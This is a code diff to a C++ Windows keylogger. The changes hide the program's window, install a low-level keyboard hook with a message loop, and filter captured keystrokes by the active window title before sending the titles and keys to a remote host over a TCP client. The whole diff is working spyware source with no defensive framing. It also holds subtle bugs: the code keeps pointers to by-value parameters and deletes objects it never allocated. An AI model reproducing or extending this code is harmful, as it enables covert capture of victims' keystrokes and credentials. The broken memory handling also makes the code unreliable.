@@ -1,5 +1,7 @@
 #include "Keylogger.h"
 
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")
+
 const std::vector<BYTE> Keylogger::valueKeys = {
 	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, // Digits 0 - 9
 	0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, //Letters A - Z
@@ -21,27 +23,38 @@ const std::vector<std::vector<BYTE>> Keylogger::keySets = { valueKeys, specialKe
 
 BYTE Keylogger::keyState[256] = { 0 };
 
-Keylogger::Keylogger(TcpClient client)
+Keylogger::Keylogger(TcpClient client, Filters filters)
 {
 	this->client = &client;
+	this->filters = &filters;
 }
 
 Keylogger::~Keylogger()
 {
+	delete(filters);
 	client->Disconnect();
-//	delete(client);
+	delete(client);
 }
 
-BOOLEAN Keylogger::TrySetHook()
+BOOLEAN Keylogger::SetHook()
 {
 	HHOOK res = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
 	if (res != NULL)
 	{
 		Keylogger::hHook = res;
-		return TRUE;
 	}
 	else
 		return FALSE;
+
+	keyState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? 0xff : 0x00;
+	MSG message;
+	while (GetMessage(&message, NULL, 0, 0))
+	{
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+	UnhookWindowsHookEx(hHook);
+	return TRUE;
 }
 
 LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPARAM lParam)
@@ -90,8 +103,14 @@ LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPAR
 
 			if (previousWindowTitle != title)
 			{
-
-
+				if (filters->Match(title))
+				{
+					isWorthy = true;
+					previousWindowTitle = title;
+					std::wstring msg = L"\n[" + title + L"]\n\t";
+					client->SendBuff(msg);
+				}
+				else isWorthy = false;
 			}
 			else if (title != L"")
 				isWorthy = true;
